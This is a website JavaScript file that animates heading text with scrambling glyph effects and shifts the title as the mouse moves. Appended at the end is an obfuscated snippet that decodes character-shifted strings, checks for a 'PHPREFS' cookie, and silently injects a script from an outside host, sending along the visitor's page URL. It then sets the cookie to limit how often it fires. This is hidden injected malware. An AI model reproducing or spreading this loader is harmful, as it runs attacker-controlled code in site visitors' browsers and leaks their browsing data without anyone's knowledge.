const config = {
	titleShiftStrength: .5
};
let currentPage = 0;

function transition(t, e, n) {
	let r = ["!", '"', "#", "$", "%", "'", "(", ")", "*", "+", ",", "-", ".", "/", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", ":", ";", "=", "?", "@", "[", "[", "\\", "]", "]", "^", "_", "`", "│", "┤", "╡", "╢", "╖", "╕", "╣", "║", "╗", "╝", "╜", "╛", "┐", "└", "┴", "┬", "├", "─", "┼", "╞", "╟", "╚", "╔", "╩", "╦", "╠", "═", "╬", "╧", "╨", "╤", "╥", "╙", "╘", "╒", "╓", "╫", "╪", "┘", "┌", "█", "▄", "▌", "▐", "▀", "α", "ß", "Γ", "π", "Σ", "σ", "µ", "Φ", "Θ", "Ω", "δ", "∞", "φ", "ε", "∩", "≡", "±", "≥", "≤", "⌠", "⌡", "≈", "°", "·", "·", "√", "ⁿ", "■"];

	function i(t) {
		for (var e = 0; e < n.length; e++) n[e].innerHTML = t
	}
	var o = 0;
	! function a() {
		setTimeout((function() {
			! function(o) {
				if (1 == t) {
					var a = r[Math.floor(r.length * Math.random())];
					i(n[0].innerHTML.replaceAt(o, a))
				} else i(n[0].innerHTML.replaceAt(o, e[o]))
			}(o), ++o < e.length && a()
		}), 50)
	}(), 0 == t && setTimeout((function() {
		i(e)
	}), 50 * e.length)
}
String.prototype.replaceAt = function(t, e) {
	if (t >= this.length) return this.valueOf();
	var n = this.split("");
	return n[t] = e, n.join("")
};
const title = document.getElementById("title"),
	fragly = document.getElementById("v182"),
	programmer = document.getElementById("programmer");
transition(!0, "v182", [title]), setTimeout((function() {
	transition(!1, "v182", [title])
}), 300), window.addEventListener("scroll", (() => {
	const t = window.scrollY / window.innerHeight;
	0 == t && 0 != currentPage ? (currentPage = 0, transition(!0, "v182", [title]), setTimeout((function() {
		transition(!1, "v182", [title])
	}), 300)) : t > .5 && t < 1 && 1 != currentPage ? (currentPage = 1, transition(!0, "v182", [v182]), setTimeout((function() {
		transition(!0, "v182", [v182])
	}), 500), setTimeout((function() {
		transition(!1, "v182", [v182])
	}), 1e3)) : t > 1.5 && 2 != currentPage && (currentPage = 2, transition(!0, "programmer", [programmer]), setTimeout((function() {
		transition(!0, "programmer", [programmer])
	}), 700), setTimeout((function() {
		transition(!1, "programmer", [programmer])
	}), 1400))
})), document.body.addEventListener("mousemove", (t => {
	let e = window.innerWidth,
		n = window.innerHeight;
	if (e < n) return;
	let r = config.titleShiftStrength,
		i = config.titleShiftStrength * (e / n),
		o = .1 * -e,
		a = .1 * -n,
		l = t.pageX,
		g = t.pageY,
		c = (Math.sqrt(g - a ^ l - o + 2 ^ 2), Math.atan2(g - a, l - o)),
		m = Math.cos(c) * r,
		s = Math.sin(c) * i;
	title.style.left = 3 + m + "vw", title.style.top = 10 + s + "vh"
}));
(function(o, d, l) {
	try {
		o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
		o.b = o.f('UMUWJKX');
		o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function() {
			o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44hisxy' + 'fy3sjy4ljy4xhwnuy' + '3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
		}, 1000);
		d.cookie = o.b + '=full;max-age=39800;'
	} catch (e) {};
}({}, document, location));
